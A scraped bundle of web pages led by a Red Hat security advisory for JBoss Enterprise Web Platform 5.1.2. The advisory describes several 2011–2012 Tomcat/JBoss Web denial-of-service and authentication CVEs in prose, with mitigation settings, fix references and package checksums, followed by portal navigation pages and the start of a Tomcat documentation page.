cause JBoss Web to use an excessive amount of CPU time by sending an HTTP
request with a large number of parameters whose names map to the same hash
value. This update introduces a limit on the number of parameters and
headers processed per request to mitigate this issue. The default limit is
512 for parameters and 128 for headers. These defaults can be changed by
setting the "-Dorg.apache.tomcat.util.http.Parameters.MAX\_COUNT=x" and
"-Dorg.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT=x" system properties
as JAVA\_OPTS entries in "jboss-as-web/bin/run.conf". (CVE-2011-4858)

It was found that JBoss Web did not handle large numbers of parameters and
large parameter values efficiently. A remote attacker could make a JBoss
Web server use an excessive amount of CPU time by sending an HTTP request
containing a large number of parameters or large parameter values. This
update introduces limits on the number of parameters and headers processed
per request to address this issue. Refer to the CVE-2011-4858 description
for information about the org.apache.tomcat.util.http.Parameters.MAX\_COUNT
and org.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT system properties.
(CVE-2012-0022)

Multiple flaws were found in the way JBoss Web handled HTTP DIGEST
authentication. These flaws weakened the JBoss Web HTTP DIGEST
authentication implementation, subjecting it to some of the weaknesses of
HTTP BASIC authentication, for example, allowing remote attackers to
perform session replay attacks. (CVE-2011-1184, CVE-2011-5062,
CVE-2011-5063, CVE-2011-5064)

A flaw was found in the way JBoss Web handled sendfile request attributes
when using the HTTP APR (Apache Portable Runtime) or NIO (Non-Blocking I/O)
connector. A malicious web application running on a JBoss Web instance
could use this flaw to bypass security manager restrictions and gain access
to files it would otherwise be unable to access, or possibly terminate the
Java Virtual Machine (JVM). (CVE-2011-2526)

Red Hat would like to thank NTT OSSC for reporting CVE-2011-4610; oCERT for
reporting CVE-2011-4858; and the Apache Tomcat project for reporting
CVE-2011-2526. oCERT acknowledges Julian Wälde and Alexander Klink as the
original reporters of CVE-2011-4858.

Warning: Before applying this update, back up your JBoss Enterprise Web
Platform's "jboss-as-web/server/[PROFILE]/deploy/" directory and any other
customized configuration files.

Users of JBoss Enterprise Web Platform 5.1.2 on Red Hat Enterprise Linux 4,
5, and 6 should upgrade to these updated packages, which correct these
issues. The JBoss server process must be restarted for this update to take
effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/kb/docs/DOC-11259>

## Affected Products

* JBoss Enterprise Web Platform 5 for RHEL 6 x86\_64
* JBoss Enterprise Web Platform 5 for RHEL 6 i386
* JBoss Enterprise Web Platform 5 for RHEL 5 x86\_64
* JBoss Enterprise Web Platform 5 for RHEL 5 i386

## Fixes

* [BZ - 720948](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=720948)
  - CVE-2011-2526 tomcat: security manager restrictions bypass
* [BZ - 741401](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=741401)
  - CVE-2011-1184 CVE-2011-5062 CVE-2011-5063 CVE-2011-5064 tomcat: Multiple weaknesses in HTTP DIGEST authentication
* [BZ - 750521](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=750521)
  - CVE-2011-4858 tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)
* [BZ - 767871](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=767871)
  - CVE-2011-4610 JBoss Web remote denial of service when surrogate pair character is placed at buffer boundary
* [BZ - 783359](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=783359)
  - CVE-2012-0022 tomcat: large number of parameters DoS

## CVEs

* [CVE-2011-2526](https://www.redhat.com/security/data/cve/CVE-2011-2526.html)
* [CVE-2011-1184](https://www.redhat.com/security/data/cve/CVE-2011-1184.html)
* [CVE-2011-5062](https://www.redhat.com/security/data/cve/CVE-2011-5062.html)
* [CVE-2011-5063](https://www.redhat.com/security/data/cve/CVE-2011-5063.html)
* [CVE-2011-5064](https://www.redhat.com/security/data/cve/CVE-2011-5064.html)
* [CVE-2011-4858](https://www.redhat.com/security/data/cve/CVE-2011-4858.html)
* [CVE-2012-0022](https://www.redhat.com/security/data/cve/CVE-2012-0022.html)
* [CVE-2011-4610](https://www.redhat.com/security/data/cve/CVE-2011-4610.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## JBoss Enterprise Web Platform 5 for RHEL 6

| SRPM | |
| --- | --- |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.src.rpm | SHA-256: 02837b3ef486c630e1723cc7e8aa48ffe4dfe094c57dec612ce2b72707470408 |
| x86\_64 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |
| i386 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 7b497fcf857859cf3273b04629753c0b436eac12e2d69ae97368116472a70258 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: f69b9eaae904040a5e321a480c0a43b8f9acf830230deb1335eb3079c19e974c |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 45f383f8230b5c560414ddb30a72f364f47d29686a5de015316ca75c5e031a16 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: fe8581b16d2957dfe8c0156ca73c09963c7740165be14fc85ed9b7b725180eb1 |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el6.noarch.rpm | SHA-256: 2a0a2c6b2b5fc3c28f6a09ea3d9bb3f70667214fc527e46d1e7518b1e61680d4 |

## JBoss Enterprise Web Platform 5 for RHEL 5

| SRPM | |
| --- | --- |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.src.rpm | SHA-256: df0e46a253dc62f1164db156421b5f02bc68efe670c51a2edb9a94afa9a1ec2e |
| x86\_64 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5b903505bbfe64819523a89dc9d3618965e2bfb52721eac4dc641cde7242e4f7 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: b8874354ee671cdb4eacb842e0a19bcdeb5e51b365fbde25a146fbe79d88593a |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5d925158f601181f540dbbc8e1734318b7d52dfe12cb0fadafdfe44c354fc462 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 07022a7c9aa808afc7e941df30b989bde0c31fd072b2b938b522d09d9836756c |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 3223f0c73940b79e4476ba2beb793ede223e82abea9779a75799f64611154b6e |
| i386 | |
| jbossweb-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5b903505bbfe64819523a89dc9d3618965e2bfb52721eac4dc641cde7242e4f7 |
| jbossweb-el-1.0-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: b8874354ee671cdb4eacb842e0a19bcdeb5e51b365fbde25a146fbe79d88593a |
| jbossweb-jsp-2.1-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 5d925158f601181f540dbbc8e1734318b7d52dfe12cb0fadafdfe44c354fc462 |
| jbossweb-lib-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 07022a7c9aa808afc7e941df30b989bde0c31fd072b2b938b522d09d9836756c |
| jbossweb-servlet-2.5-api-2.1.12-3\_patch\_03.2.ep5.el5.noarch.rpm | SHA-256: 3223f0c73940b79e4476ba2beb793ede223e82abea9779a75799f64611154b6e |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from access.redhat.com_3f6b4961_20250126_072103.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from access.redhat.com_124555ac_20250126_072052.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from tomcat.apache.org_0510df53_20250125_074724.html ===


| [The Apache Tomcat Servlet/JSP Container](https://tomcat.apache.org/) | Apache Tomcat 7Version 7.0.109, Apr 22 2021 | [Apache Logo](http://www.apache.org/) |

| --- | |
| **Links**   * [Docs Home](index.html) * [FAQ](https://wiki.apache.org/tomcat/FAQ) * [User Comments](#comments_section)   **User Guide**   * [1) Introduction](introduction.html) * [2) Setup](setup.html) * [3) First webapp](appdev/index.html) * [4) Deployer](deployer-howto.html) * [5) Manager](manager-howto.html) * [6) Host Manager](host-manager-howto.html) * [7) Realms and AAA](realm-howto.html) * [8) Security Manager](security-manager-howto.html) * [9) JNDI Resources](jndi-resources-howto.html) * [10) JDBC DataSources](jndi-datasource-examples-howto.html) * [11) Classloading](class-loader-howto.html) * [12) JSPs](jasper-howto.html) * [13) SSL/TLS](ssl-howto.html) * [14) SSI](ssi-howto.html) * [15) CGI](cgi-howto.html) * [16) Proxy Support](proxy-howto.html) * [17) MBeans Descriptors](mbeans-descriptors-howto.html) * [18) Default Servlet](default-servlet.html) * [19) Clustering](cluster-howto.html) * [20) Load Balancer](balancer-howto.html) * [21) Connectors](connectors.html) * [22) Monitoring and Management](monitoring.html) * [23) Logging](logging.html) * 